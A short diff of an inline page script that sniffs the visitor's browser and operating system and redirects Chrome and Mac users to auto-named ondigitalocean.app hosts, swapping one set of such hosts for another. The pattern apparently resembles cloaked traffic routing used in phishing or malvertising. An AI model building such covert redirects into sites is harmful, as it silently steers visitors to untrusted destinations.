@@ -16,11 +16,11 @@
 
         if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
           // is Google chrome
-        window.location.href = "https://hammerhead-app-6tpm8.ondigitalocean.app/";
+        window.location.href = "https://king-prawn-app-98jbc.ondigitalocean.app/    ";
         }
         if(window.navigator.userAgent.indexOf("Mac") != -1 )
           {
-               window.location.href = "https://orca-app-hpusl.ondigitalocean.app/";
+               window.location.href = "https://squid-app-pk4wa.ondigitalocean.app/";
           }
         $SAFARI_URL = "apple";
         </script>
